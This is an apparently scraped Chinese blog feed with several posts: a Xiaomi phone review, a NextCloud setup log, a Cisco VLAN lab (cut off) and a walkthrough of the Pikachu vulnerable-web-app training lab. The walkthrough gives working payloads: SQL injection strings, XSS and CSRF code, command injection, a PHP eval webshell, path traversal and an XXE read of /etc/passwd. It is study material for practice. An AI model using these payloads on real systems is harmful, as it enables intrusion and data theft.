<h2 id="解锁"><a href="#解锁" class="headerlink" title="解锁"></a>解锁</h2><p>到手解锁，老小米用户表示很赞</p>
<p><img data-src="/images/Article/Mi-10-Pro-experience/Untitled%201.png" alt="/images/Article/Mi-10-Pro-experience/Untitled%201.png"></p>
<p>然后升级了 MIUI12 稳定版</p>
<p><img data-src="/images/Article/Mi-10-Pro-experience/Untitled%202.png" alt="/images/Article/Mi-10-Pro-experience/Untitled%202.png"></p>
<p>不过我并没有换 rec 和 root，好像没有啥必要的模块需要安装，解锁只是为了方便以后使用钛备份转移数据而不会一解锁就清空 data 分区。</p>
<h2 id="使用中出现的部分问题"><a href="#使用中出现的部分问题" class="headerlink" title="使用中出现的部分问题"></a>使用中出现的部分问题</h2><p>关于这个手机的优点在其他很多视频已经提到过了，这里就提一下手机使用过程中出现的一些问题。</p>
<blockquote>
<p>以下使用体验纯主观，主要提及在作为一个不打游戏不咋拍照的我的使用下手机出现的一些问题</p>
</blockquote>
<h3 id="Wi-Fi-断流问题"><a href="#Wi-Fi-断流问题" class="headerlink" title="Wi-Fi 断流问题"></a>Wi-Fi 断流问题</h3><p>路由器设备：刷了 padavan 的 K2P &amp; Newifi 3</p>
<p>就最近一星期的手机体验来看，发现网上所说的断流问题在我的手机上确实存在，具体表现为使用一段时间后 bilibili、酷安等软件无法加载数据，就连访问路由器后台界面都会报 Timed out，下图为发生断流时访问路由器界面的截图。</p>
<p><img data-src="/images/Article/Mi-10-Pro-experience/Untitled%203.png" alt="/images/Article/Mi-10-Pro-experience/Untitled%203.png"></p>
<p>但是持续时间并不长，过一会就会自己恢复，与此同时我的魅蓝 note 6 却不会出现这种状况，就很奇怪。关闭路由器上的 Clash 后该状况有所缓解，也很奇怪。</p>
<p>但好在切换一下 WiFi 开关就可以恢复，对于我这种不打游戏不关心持续连接的人来说问题不是很大。</p>
<h3 id="5G"><a href="#5G" class="headerlink" title="5G"></a>5G</h3><p> u1s1，还是之前媒体将 5G 概念吹得太过了，导致好像用了 5G 能够翻天覆地一样。但实际上使用的时候感觉和 4G 体验无差，在显示 5G 信号的时候 SIM 卡状态写的也是 4G</p>
<p><img data-src="/images/Article/Mi-10-Pro-experience/Untitled%204.png" alt="/images/Article/Mi-10-Pro-experience/Untitled%204.png"></p>
<p>实际用处真没那么明显，<del>所以 5G 有什么用，我到手就把 5G 关了。</del></p>
<h3 id="充电和耗电"><a href="#充电和耗电" class="headerlink" title="充电和耗电"></a>充电和耗电</h3><p>对于在疫情期间一天到晚泡在房间里的人，其实倒是不是很关心电池的消耗问题，不过这个 4500 的电池在 MIUI12 之下似乎没有体现出来，感觉耗电有点快，在酷安上描述似乎是 MIUI12 的锅，也有人因此特意刷回 MIUI11 的。</p>
<p>不过充电确实很快，出门之前小小充一下能快速恢复 20% 的电量，还是很不错的。</p>
<p>（没图，等使用了再附</p>
<h3 id="小窗模式（MIUI）"><a href="#小窗模式（MIUI）" class="headerlink" title="小窗模式（MIUI）"></a>小窗模式（MIUI）</h3><p>MIUI12 的小窗模式挺好用的，特别是通知快捷回复的时候拉下来就能直接用，相较于 flyme 一个特别的优点就是在操作小窗的时候可以同时操作背后的内容，方便一键切换。</p>
<p>不过有一个问题，就是 MIUI12 的小窗唤出没 flyme 那么方便，可以从侧边唤出。</p>
<h3 id="双扬声器问题"><a href="#双扬声器问题" class="headerlink" title="双扬声器问题"></a>双扬声器问题</h3><p>关于这个，我没有细用过 MIUI11，不知道原来的扬声器效果是怎样的，只见到酷安上一片骂。对于我这种长期单扬声器用户来说，第一次打开这玩意儿播歌，反正是有点震撼的，就像是买了个喇叭一样。</p>
<p>不过按照酷安酷友的方法安装了 dxo 版的音质音效以后，就更震撼了，确实感觉是之前有所削减。不过我感觉还好，本来就挺 8 错的。</p>
<p>不过说是这么说，实际上听音乐的时候我还是喜欢拿以前华为开发者送的那个小音响来听歌，感觉这个实际体验会比较好。</p>
<h3 id="曲面屏"><a href="#曲面屏" class="headerlink" title="曲面屏"></a>曲面屏</h3><p>小米 10 pro 的曲面屏其实还好，没其他手机那么夸张，对于我来说刚刚好，用起来挺舒适的，认识我的人也知道我是个不怎么打游戏的人，所以对于我来说也是挺 8 错的</p>
<h3 id="90-Hz？"><a href="#90-Hz？" class="headerlink" title="90 Hz？"></a>90 Hz？</h3><p>说实话这个 90Hz 我每次去小米之家体验的时候真的感觉很惊艳，然后体验完回来就会感觉好爽好想买。但是实际上购买以后用不久感知不强，这个 90Hz 并不是全局 90Hz，有时候主观感觉上还会掉到 60Hz 以下。可能需要刷入全局 90Hz 来保持 90Hz 的恒定。</p>
<h1 id="后言"><a href="#后言" class="headerlink" title="后言"></a>后言</h1><p>这里就不提 小米 10 Pro 的问题了，简单聊一下其他方面的东西</p>
<h2 id="购买渠道？"><a href="#购买渠道？" class="headerlink" title="购买渠道？"></a>购买渠道？</h2><p>购买渠道为什么选择拼多多，因为穷</p>
<p>说实话，之前也想上京东的车的，但是没赶上北京券，也没赶上必胜客。</p>
<p>购买手机之前可以先看一下酷安之类的关于该类手机的讨论，真的可以省一大笔钱</p>
<p>拼多多大概认准百亿补贴的车，基本不会翻车，稳得很</p>
<p><del>本来是对拼多多嗤之以鼻的，但真正试了一下发现真香，i 了</del></p>
<h2 id="旧的-6SP？"><a href="#旧的-6SP？" class="headerlink" title="旧的 6SP？"></a>旧的 6SP？</h2><p>在不受支付宝微信在主力机的捆绑下，旧的 6sp 终于可以越狱装一些乱七八糟的插件了，有机会的话可以水一篇博文推荐一下目前备用机 6sp 正在使用的一些越狱插件，使用体验++</p>
<p>总的来说，感觉米 10 Pro 作为一款手机对我来说确实不错，至少买回来没有像 XPS 那样糟心，等有空我也一定要写一篇文章来痛批一下 XPS 这台玩意，用着太糟心了。</p>
]]></content>
      <categories>
        <category>产品体验</category>
        <category>小米</category>
      </categories>
      <tags>
        <tag>MIUI</tag>
        <tag>Experience</tag>
      </tags>
  </entry>
  <entry>
    <title>校园网文件共享方案（NextCloud）</title>
    <url>/archives/NextCloud-Share.html</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>如<a href="https://guo.moe/archives/Samba-Share.html">上文</a>所述，Samba 因 445 端口被校园网屏蔽无法使用，所以只能使用另一种方案，于是就想到了 NextCloud + WebDav 这种方案</p>
<span id="more"></span>

<h1 id="安装配置"><a href="#安装配置" class="headerlink" title="安装配置"></a>安装配置</h1><h2 id="服务器的配置与安装"><a href="#服务器的配置与安装" class="headerlink" title="服务器的配置与安装"></a>服务器的配置与安装</h2><p>在 <a href="https://nextcloud.com/install/#instructions-server">https://nextcloud.com/install/#instructions-server</a> 下载压缩包后，在服务器上解压缩，按照步骤一步步填入数据库资料进行安装，安装过程中可能会出现 504 超时错误，稍等两三分钟待 config/config.php 文件中出现</p>
<pre><code>&#39;installed&#39; =&gt; true
</code></pre>
<p>即为安装完毕。</p>
<h2 id="NTFS-文件系统的配置问题"><a href="#NTFS-文件系统的配置问题" class="headerlink" title="NTFS 文件系统的配置问题"></a>NTFS 文件系统的配置问题</h2><p>安装完成后，无法正常访问，提示</p>
<pre><code>Please change the permissions to 0770 so that the directory cannot be listed by other users.
</code></pre>
<p>排查原因后，发现</p>
<p>由于硬盘本身是 NTFS，导致 data 文件映射后一直有权限问题，没有啥其他好的方法，只能忽略错误了。</p>
<blockquote>
<p>参考资料：<a href="https://b1ue.me/archives/183">https://b1ue.me/archives/183</a></p>
</blockquote>
<p>在 config/config.php 下加入</p>
<pre><code>&#39;check_data_directory_permissions&#39; =&gt; false
</code></pre>
<p>虽然有用，但十分不建议使用，除非是真的无可奈何，请不要使用这种方法。此文件将会允许任何知道文件路径的人访问获取文件。</p>
<h2 id="WebDav-配置"><a href="#WebDav-配置" class="headerlink" title="WebDav 配置"></a>WebDav 配置</h2><h3 id="Explorer-exe-资源管理器的配置"><a href="#Explorer-exe-资源管理器的配置" class="headerlink" title="Explorer.exe 资源管理器的配置"></a>Explorer.exe 资源管理器的配置</h3><p>具体步骤如上一篇文章，此电脑右键映射网络驱动器写入 WebDav 的链接，链接可以在下图中所在位置找到（点击设置，会出现 WebDav 地址）</p>
<p>但据同学反映，此处写入后会出现 错误67：找不到网络名 的错误，遂换方法</p>
<p>其中参考过 <a href="https://blog.lim-light.com/archives/mapping-a-windows-drive-to-a-webdav-server.html">在 Windows 上正确优雅地挂载 WebDAV - 黎明余光</a> 这篇文章的方法，使用命令</p>
<pre><code>NET USE * https://nextcloud.*************/remote.php/webdav/
</code></pre>
<p>但莫用，在命令提示框内继续显示 错误67：找不到网络名，还是要更换方法。</p>
<h3 id="RaiDrive-的使用"><a href="#RaiDrive-的使用" class="headerlink" title="RaiDrive 的使用"></a>RaiDrive 的使用</h3><p>以前看<del>小h</del>番的时候有将 Google Drive 挂载到本地磁盘看过，效果还不错，所以这次就尝试在 RaiDrive 挂载 WebDav 的方法。<a href="https://www.raidrive.com/Download">[下载链接]</a></p>
<p>安装后添加网络磁盘，选择 NextCloud ，成功挂载</p>
<p><del>（但速度好像一般，会卡死 Explorer.exe</del></p>
<p>重启以后又好了 emm</p>
<p>但速率还是一般，内网最高才 6M/s 左右，不知道是哪里问题</p>
<p>（晚上试了一下好像是教室路由器是百兆的，别人用了我就慢了（x</p>
<h2 id="开放注册"><a href="#开放注册" class="headerlink" title="开放注册"></a>开放注册</h2><h3 id="设置邮箱服务器"><a href="#设置邮箱服务器" class="headerlink" title="设置邮箱服务器"></a>设置邮箱服务器</h3><p>在设置中设置好邮件服务商提供的 SMTP 服务器信息，发送邮件测试是否可以通过</p>
<h3 id="安装-registration-apps"><a href="#安装-registration-apps" class="headerlink" title="安装 registration apps"></a>安装 registration apps</h3><p>此处下载 apps <a href="https://apps.nextcloud.com/apps/registration">https://apps.nextcloud.com/apps/registration</a> ，在 /apps 中解压压缩文件，在设置中启用应用，其他设置中稍微配置一下即可</p>
<h3 id="然后失败"><a href="#然后失败" class="headerlink" title="然后失败"></a>然后失败</h3><p>配置完成以后，不知道为什么在尝试填入注册邮箱的时候都会报 500 错误，暂未修复。</p>
<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>总的来说 NextCloud 的安装就这样了，感觉还是达不到自己的预期，看看还后没有其他的方法</p>
]]></content>
      <categories>
        <category>技术篇</category>
      </categories>
      <tags>
        <tag>瞎搞</tag>
        <tag>File Share</tag>
        <tag>NextCloud</tag>
      </tags>
  </entry>
  <entry>
    <title>【Klee-CTF】 Pikachu 漏洞练习</title>
    <url>/archives/Pikachu-exercise.html</url>
    <content><![CDATA[<blockquote>
<p>此文章为 Klee-CTF 专题</p>
</blockquote>
<h1 id="准备资料"><a href="#准备资料" class="headerlink" title="准备资料"></a>准备资料</h1><p>弱密码资料：<a href="https://github.com/danielmiessler/SecLists/tree/master/Passwords/Common-Credentials">https://github.com/danielmiessler/SecLists/tree/master/Passwords/Common-Credentials</a></p>
<h1 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h1><h2 id="基于表单的破解"><a href="#基于表单的破解" class="headerlink" title="基于表单的破解"></a>基于表单的破解</h2><p>使用 burpsuite ，一般用户名使用admin，密码可以通过burpsuite破解</p>
<span id="more"></span>

<p><img data-src="Pikachu-exercise/Untitled.png" alt="Pikachu-exercise/Untitled.png"></p>
<p>首先输入 admin admin 构造一个请求</p>
<p><img data-src="Pikachu-exercise/Untitled%201.png" alt="Pikachu-exercise/Untitled%201.png"></p>
<p><img data-src="Pikachu-exercise/Untitled%202.png" alt="Pikachu-exercise/Untitled%202.png"></p>
<p><img data-src="Pikachu-exercise/Untitled%203.png" alt="Pikachu-exercise/Untitled%203.png"></p>
<p>清除一下无关参数，只保留 password</p>
<p>回到burpsuite，发现有一个payload的长度明显有点问题</p>
<p><img data-src="Pikachu-exercise/Untitled%204.png" alt="Pikachu-exercise/Untitled%204.png"></p>
<p>输入测试，诶成了</p>
<p><img data-src="Pikachu-exercise/Untitled%205.png" alt="Pikachu-exercise/Untitled%205.png"></p>
<h2 id="验证码绕过-on-server"><a href="#验证码绕过-on-server" class="headerlink" title="验证码绕过 (on server)"></a>验证码绕过 (on server)</h2><p>对网络请求，提取出关键，发现当且仅当访问 <a href="http://172.16.40.2/pikachu/inc/showvcode.php">http://172.16.40.2/pikachu/inc/showvcode.php</a> 时，验证码才会发生改变，连续curl以下内容时，验证码是始终保持有效的</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">curl <span class="string">&#x27;http://172.16.40.2/pikachu/vul/burteforce/bf_server.php&#x27;</span> \</span><br><span class="line">-H <span class="string">&#x27;Cookie: PHPSESSID=8768b544b64dd8fc234b2b936c37c4ab; KOD_SESSION_ID=95908a94410cbb3970b38095670462ca; CSRF_TOKEN=xRTn99HD7XY3BFEs&#x27;</span> \</span><br><span class="line">  --data-raw <span class="string">&#x27;username=admin&amp;password=admin&amp;vcode=gynqsw&amp;submit=Login&#x27;</span> \</span><br><span class="line">  --compressed</span><br></pre></td></tr></table></figure>

<p>接下来的操作步骤和上面一致。</p>
<h1 id="反射型xss（get）-存储型xss"><a href="#反射型xss（get）-存储型xss" class="headerlink" title="反射型xss（get）/ 存储型xss"></a>反射型xss（get）/ 存储型xss</h1><p><a href="http://192.168.44.128:8080/vul/xss/xss_reflected_get.php?message=%3Cscript%3Ealert(1)%3C/script%3E&submit=submit#"><code>http://192.168.44.128:8080/vul/xss/xss_reflected_get.php?message=&lt;script&gt;alert(1)&lt;%2Fscript&gt;&amp;submit=submit#</code></a></p>
<p><a href="https://segmentfault.com/a/1190000021899373">https://segmentfault.com/a/1190000021899373</a></p>
<p>在message内写入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">![Pikachu-exercise/Untitled%206.png](Pikachu-exercise/Untitled%206.png)</span><br><span class="line"></span><br><span class="line"># DOM 型 xss/DOM 型 xss-x</span><br><span class="line"></span><br><span class="line">1. 在框内输入 `javascript:alert(1)` ，点击链接触发</span><br><span class="line"></span><br><span class="line">![Pikachu-exercise/Untitled%207.png](Pikachu-exercise/Untitled%207.png)</span><br><span class="line"></span><br><span class="line">1. 在本页面不做任何操作就触发</span><br><span class="line"></span><br><span class="line">尝试：</span><br><span class="line"></span><br><span class="line">- `&#x27; &gt;&lt;/a&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;a&gt;` 结果看页面是有了，但是没法弹出来</span><br><span class="line">- `&#x27;onmousemove=&quot;alert(1)&quot;` 在链接上移动触发</span><br><span class="line"></span><br><span class="line">![Pikachu-exercise/Untitled%208.png](Pikachu-exercise/Untitled%208.png)</span><br><span class="line"></span><br><span class="line"># CSRF(get)/CSRF(post)</span><br><span class="line"></span><br><span class="line">该链接修改信息参数都放在url上，所以要修改可以直接从url下手</span><br><span class="line"></span><br><span class="line">```jsx</span><br><span class="line">http://192.168.44.128:8080/vul/csrf/csrfget/csrf_get_edit.php?sex=2&amp;phonenum=2&amp;add=2&amp;email=2&amp;submit=submit</span><br></pre></td></tr></table></figure>

<p>可修改 sex，phonenum，add等参数，并通过ajax无感知地修改用户的数据。不行就整个链接嘛，或者window.open</p>
<p>直接javascript，</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">fetch(<span class="string">&quot;http://192.168.44.128:8080/vul/csrf/csrfget/csrf_get_edit.php?sex=2&amp;phonenum=2&amp;add=2&amp;email=2&amp;submit=submit&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>post同理，可以用form构造</p>
<p>网站源码？拿来吧你，随便找个html套上然后改一下这个action为目标页面就可</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">&lt;form method=<span class="string">&quot;post&quot;</span> action=<span class="string">&quot;http://192.168.44.128:8080/vul/csrf/csrfget/csrf_get_edit.php&quot;</span>&gt;</span><br><span class="line">   <span class="xml"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">&quot;per_title&quot;</span>&gt;</span>hello,,欢迎来到个人会员中心 | <span class="tag">&lt;<span class="name">a</span> <span class="attr">style</span>=<span class="string">&quot;color:bule;&quot;</span> <span class="attr">href</span>=<span class="string">&quot;csrf_post.php?logout=1&quot;</span>&gt;</span>退出登录<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line">   <span class="xml"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;per_name&quot;</span>&gt;</span>姓名:<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line">   &lt;p class=&quot;per_sex&quot;&gt;性别:&lt;input type=&quot;text&quot; name=&quot;sex&quot; value=&quot;&quot;&gt;&lt;/p&gt;</span><br><span class="line">   &lt;p class=&quot;per_phone&quot;&gt;手机:&lt;input class=&quot;phonenum&quot; type=&quot;text&quot; name=&quot;phonenum&quot; value=&quot;&quot;&gt;&lt;/p&gt;    </span><br><span class="line">   &lt;p class=&quot;per_add&quot;&gt;住址:&lt;input class=&quot;add&quot; type=&quot;text&quot; name=&quot;add&quot; value=&quot;&quot;&gt;&lt;/p&gt; </span><br><span class="line">   &lt;p class=&quot;per_email&quot;&gt;邮箱:&lt;input class=&quot;email&quot; type=&quot;text&quot; name=&quot;email&quot; value=&quot;&quot;&gt;&lt;/p&gt; </span><br><span class="line">   &lt;input class=&quot;sub&quot; type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;submit&quot;&gt;</span><br><span class="line">   &lt;/form&gt;</span><br></pre></td></tr></table></figure>

<h1 id="搜索型注入"><a href="#搜索型注入" class="headerlink" title="搜索型注入"></a>搜索型注入</h1><p>输入 <code>a&#39; or 1=1 #</code> 即可匹配所有用户， <code>%%</code> 也行，%是通配符</p>
<p><img data-src="Pikachu-exercise/Untitled%209.png" alt="Pikachu-exercise/Untitled%209.png"></p>
<h1 id="基于-boolian-的盲注"><a href="#基于-boolian-的盲注" class="headerlink" title="基于 boolian 的盲注"></a>基于 boolian 的盲注</h1><p>当你已经知道了数据库中存在一个为kobe的用户，这里相当于一个判断语句只能给你返回是或否，注入可以利用其判断语句+判断字符来判断其完整字符串。</p>
<p>比如此处输入 <code>kobe</code>，可以正常地返回其信息</p>
<p>而输入 <code>kobe&#39; and 1=1#</code> 也可以， <code>kobe&#39; and 1=2#</code> 就不行了</p>
<p>但其他 MySQL 语句还是可以执行的嘛！不知道其他信息，靠判断猜！</p>
<p>比如说，MySQL里面有select, substr, ascii等语句，可以通过逐字符判断来判断其数据库名</p>
<h1 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h1><p>原理其实和上面差不多，也是利用信息来判断信息，只不过这里利用的是睡眠时间，使用判断条件+sleep(x)，满足条件的时候睡眠x秒</p>
<p><code>1&#39; or sleep(3)#</code> 来测试，<code>sleep()</code>可用</p>
<p>比如说我们在数据库中使用 <code>select if (database()=&#39;pikachu&#39;, sleep(5), 1)</code> ，使用了五秒，可以判断当前数据库名称为 <code>pikachu</code></p>
<h1 id="exec-“ping”"><a href="#exec-“ping”" class="headerlink" title="exec “ping”"></a>exec “ping”</h1><p>笑死，他的docker上没有ping，但是其他命令可以执行</p>
<p><code>;whoami;ls;pwd</code> ，是没有对输入ip进行过滤</p>
<p><img data-src="Pikachu-exercise/Untitled%2010.png" alt="Pikachu-exercise/Untitled%2010.png"></p>
<h1 id="File-Inclusion-remote"><a href="#File-Inclusion-remote" class="headerlink" title="File Inclusion(remote)"></a>File Inclusion(remote)</h1><p>我这里没开 allow_url_include，所以就不演示了，但远程可以构造一个txt文件，里面写</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	<span class="built_in">eval</span>($_GET[<span class="string">&#x27;x&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p><img data-src="Pikachu-exercise/Untitled%2011.png" alt="Pikachu-exercise/Untitled%2011.png"></p>
<h1 id="Unsafe-Filedownload"><a href="#Unsafe-Filedownload" class="headerlink" title="Unsafe Filedownload"></a>Unsafe Filedownload</h1><p>查看链接格式</p>
<p><a href="http://192.168.44.128:8080/vul/unsafedownload/execdownload.php?filename=kb.png">http://192.168.44.128:8080/vul/unsafedownload/execdownload.php?filename=kb.png</a></p>
<p>容易得知这个filename可以利用，修改为execdownload.php，404，应该图片被放在子目录了，那就修改为../execdownload.php，成功获取</p>
<p><a href="http://192.168.44.128:8080/vul/unsafedownload/execdownload.php?filename=../execdownload.php">http://192.168.44.128:8080/vul/unsafedownload/execdownload.php?filename=../execdownload.php</a></p>
<p><img data-src="Pikachu-exercise/Untitled%2012.png" alt="Pikachu-exercise/Untitled%2012.png"></p>
<h1 id="Unsafe-Fileupload→client-check"><a href="#Unsafe-Fileupload→client-check" class="headerlink" title="Unsafe Fileupload→client check"></a>Unsafe Fileupload→client check</h1><p>F12 直接把这个去掉，好像不行</p>
<p><img data-src="Pikachu-exercise/Untitled%2013.png" alt="Pikachu-exercise/Untitled%2013.png"></p>
<p>用burpsuite拦截响应请求把这个给去掉，重新上传，getdaze</p>
<p><img data-src="Pikachu-exercise/Untitled%2014.png" alt="Pikachu-exercise/Untitled%2014.png"></p>
<p><img data-src="Pikachu-exercise/Untitled%2015.png" alt="Pikachu-exercise/Untitled%2015.png"></p>
<h1 id="Over-Permission"><a href="#Over-Permission" class="headerlink" title="Over Permission"></a>Over Permission</h1><p>查看提示，使用 pikachu/000000 登录，发现只有查看权限</p>
<p><img data-src="Pikachu-exercise/Untitled%2016.png" alt="Pikachu-exercise/Untitled%2016.png"></p>
<p>使用admin/123456登录，发现有添加权限，地址为</p>
<p><a href="http://192.168.44.128:8080/vul/overpermission/op2/op2_admin_edit.php">http://192.168.44.128:8080/vul/overpermission/op2/op2_admin_edit.php</a></p>
<p>回到pikachu，同样访问上面地址，发现可以正常访问</p>
<p><img data-src="Pikachu-exercise/Untitled%2017.png" alt="Pikachu-exercise/Untitled%2017.png"></p>
<p>也可以正常添加</p>
<h1 id="→目录遍历"><a href="#→目录遍历" class="headerlink" title="../../→目录遍历"></a>../../→目录遍历</h1><p>用了哪些函数类型？</p>
<p>随便点击一个，发现地址有关键字 <code>xxx.php</code></p>
<p><img data-src="Pikachu-exercise/Untitled%2018.png" alt="Pikachu-exercise/Untitled%2018.png"></p>
<p>作死试试 <code>../../../index.php</code> ，笑死，还套娃了</p>
<p><img data-src="Pikachu-exercise/Untitled%2019.png" alt="Pikachu-exercise/Untitled%2019.png"></p>
<h1 id="敏感信息泄露→IcanseeyourABC"><a href="#敏感信息泄露→IcanseeyourABC" class="headerlink" title="敏感信息泄露→IcanseeyourABC"></a>敏感信息泄露→IcanseeyourABC</h1><p>F12查看，嚯哟这有个账号</p>
<p><img data-src="Pikachu-exercise/Untitled%2020.png" alt="Pikachu-exercise/Untitled%2020.png"></p>
<p><img data-src="Pikachu-exercise/Untitled%2021.png" alt="Pikachu-exercise/Untitled%2021.png"></p>
<p>登陆成功</p>
<h1 id="PHP-反序列化"><a href="#PHP-反序列化" class="headerlink" title="PHP 反序列化"></a>PHP 反序列化</h1><p>构造PHP payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">s</span></span>&#123;</span><br><span class="line">		<span class="keyword">public</span> <span class="variable">$test</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> s();</span><br><span class="line"><span class="variable">$a</span>-&gt;test = <span class="string">&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>

<p>不过我猜测，这个类名和参数名有一个没猜对都没法用吧？</p>
<p><img data-src="Pikachu-exercise/Untitled%2022.png" alt="Pikachu-exercise/Untitled%2022.png"></p>
<p><img data-src="Pikachu-exercise/Untitled%2023.png" alt="Pikachu-exercise/Untitled%2023.png"></p>
<h1 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h1><p>我看不懂，但我大受震撼.jpg</p>
<p>参考资料 <a href="https://www.freebuf.com/vuls/265859.html">https://www.freebuf.com/vuls/265859.html</a></p>
<p>根据文章，可以构造一个这样的恶意payload来获取任意文件内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version = &quot;1.0&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY f SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line"></span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;x&gt;&amp;f;&lt;/x&gt;</span><br></pre></td></tr></table></figure>

<p><img data-src="Pikachu-exercise/Untitled%2024.png" alt="Pikachu-exercise/Untitled%2024.png"></p>
<p>然后可以获取到 /etc/passwd 的内容了</p>
<h1 id="URL-重定向"><a href="#URL-重定向" class="headerlink" title="URL 重定向"></a>URL 重定向</h1><p>@某佛大SSO</p>
<p><a href="http://192.168.44.128:8080/vul/urlredirect/urlredirect.php?url=https://baidu.com">http://192.168.44.128:8080/vul/urlredirect/urlredirect.php?url=https://baidu.com</a></p>
<h1 id="SSRF-curl"><a href="#SSRF-curl" class="headerlink" title="SSRF(curl)"></a>SSRF(curl)</h1><p>这个curl可以用作访问仅限内网访问的应用，比如docker之间</p>
<p><img data-src="Pikachu-exercise/Untitled%2025.png" alt="Pikachu-exercise/Untitled%2025.png"></p>
<h1 id="复盘"><a href="#复盘" class="headerlink" title="复盘"></a>复盘</h1><ul>
<li><p>搜索型注入中 两个%是为了闭合，补充union等知识（比赛时一般都只能手工注入）</p>
<p>  <img data-src="Pikachu-exercise/Untitled%2026.png" alt="Pikachu-exercise/Untitled%2026.png"></p>
<p>  <a href="https://www.yuque.com/docs/share/a9f3ca4d-b032-46ab-ad68-459e0177d911#37039777">https://www.yuque.com/docs/share/a9f3ca4d-b032-46ab-ad68-459e0177d911?#37039777</a></p>
<p>  <a href="https://www.yuque.com/docs/share/6d18cc14-f0de-4b5f-aebe-6543304e48b1#">https://www.yuque.com/docs/share/6d18cc14-f0de-4b5f-aebe-6543304e48b1?#</a></p>
</li>
<li><p>XSS 是怎么实现反弹的</p>
<p>  实例源码：<a href="https://github.com/orangetw/My-CTF-Web-Challenges/blob/master/hitcon-ctf-2020/oStyle/bot.py">https://github.com/orangetw/My-CTF-Web-Challenges/blob/master/hitcon-ctf-2020/oStyle/bot.py</a></p>
  <figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">client = webdriver.Chrome(<span class="string">&#x27;./chromedriver&#x27;</span>, chrome_options=chrome_options)</span><br><span class="line"></span><br><span class="line">client.add_cookie(&#123;</span><br><span class="line">        <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;this-is-for-you&#x27;</span>, </span><br><span class="line">        <span class="string">&#x27;value&#x27;</span>: FLAG, </span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure>

<p>  一般可以通过 chromedriver 模拟访问来实现 xss 反弹，在访问的时候添加上 cookie 里的 flag</p>
</li>
<li><p>PHP 反序列化 <a href="https://xz.aliyun.com/t/6753">https://xz.aliyun.com/t/6753</a></p>
<p>  <img data-src="Pikachu-exercise/Untitled%2027.png" alt="Pikachu-exercise/Untitled%2027.png"></p>
</li>
</ul>
]]></content>
      <categories>
        <category>CTF</category>
        <category>技术篇</category>
      </categories>
  </entry>
  <entry>
    <title>计算机网络原理实验二──二层交换机基本配置</title>
    <url>/archives/Principles-Of-Computer-Networks-Experiment-2.html</url>
    <content><![CDATA[<h1 id="预先准备"><a href="#预先准备" class="headerlink" title="预先准备"></a>预先准备</h1><p>先在 CPT(Cisco Packet Tracer) 上放置两个PC，两个Switch，然后将PC与各自的 Switch 通过  Copper Straight-Through 连接，交换机之间通过 Copper Cross-over 连接，此处两个 Switch 使用 2950-24 型号，将Switch的0/1口和PC进行连接，将Switch的0/24口相互连接。</p>
<p>我们的目的是将这四个设备划分在一个 VLAN(VLAN 10) 中。</p>
<span id="more"></span>

<h1 id="接口与-VLAN-配置"><a href="#接口与-VLAN-配置" class="headerlink" title="接口与 VLAN 配置"></a>接口与 VLAN 配置</h1><h2 id="查看vlan信息"><a href="#查看vlan信息" class="headerlink" title="查看vlan信息"></a>查看vlan信息</h2><p>双击 Switch 打开 CLI，默认是用户模式，输入enable进入特权模式，输入 show vlan 即可查看目前的VLAN状况，由此可见接口都默认接在VLAN1上。</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">Switch&gt;enable</span><br><span class="line">Switch#show vlan</span><br><span class="line"></span><br><span class="line">VLAN Name                             Status    Ports</span><br><span class="line">---- -------------------------------- --------- -------------------------------</span><br><span class="line"><span class="number">1</span>    <span class="keyword">default</span>                          active    Fa0/<span class="number">1</span>, Fa0/<span class="number">2</span>, Fa0/<span class="number">3</span>, Fa0/<span class="number">4</span></span><br><span class="line">                                                Fa0/<span class="number">5</span>, Fa0/<span class="number">6</span>, Fa0/<span class="number">7</span>, Fa0/<span class="number">8</span></span><br><span class="line">                                                Fa0/<span class="number">9</span>, Fa0/<span class="number">10</span>, Fa0/<span class="number">11</span>, Fa0/<span class="number">12</span></span><br><span class="line">                                                Fa0/<span class="number">13</span>, Fa0/<span class="number">14</span>, Fa0/<span class="number">15</span>, Fa0/<span class="number">16</span></span><br><span class="line">                                                Fa0/<span class="number">17</span>, Fa0/<span class="number">18</span>, Fa0/<span class="number">19</span>, Fa0/<span class="number">20</span></span><br><span 